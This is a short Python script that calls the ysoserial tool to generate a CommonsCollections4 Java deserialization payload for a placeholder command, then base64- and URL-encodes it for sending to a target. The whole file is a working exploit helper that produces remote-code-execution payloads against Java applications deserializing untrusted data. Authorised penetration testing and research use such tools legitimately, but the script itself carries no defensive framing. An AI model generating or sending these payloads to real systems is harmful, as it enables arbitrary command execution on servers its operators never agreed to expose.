import subprocess
import base64
import urllib.parse


def get_ysoserial_payload(command, payloadType, path_to_ysoserial='ysoserial.jar'):
    cmd = [
        'java',
        '--add-opens', 'java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED',
        '--add-exports', 'java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED',
        '-jar', path_to_ysoserial, payloadType, command
    ]
    try:
        proc = subprocess.check_output(cmd)
        base64_payload = base64.b64encode(proc).decode()
        urlEncoded_payload = urllib.parse.quote(base64_payload)
        return urlEncoded_payload
    except subprocess.CalledProcessError as e:
        print(f"Error while generating or serializing payload: {e}")
        return None


payload = get_ysoserial_payload('CMD', 'CommonsCollections4')


if payload:
    print(payload)
else:
    print("Failed to generate payload.")
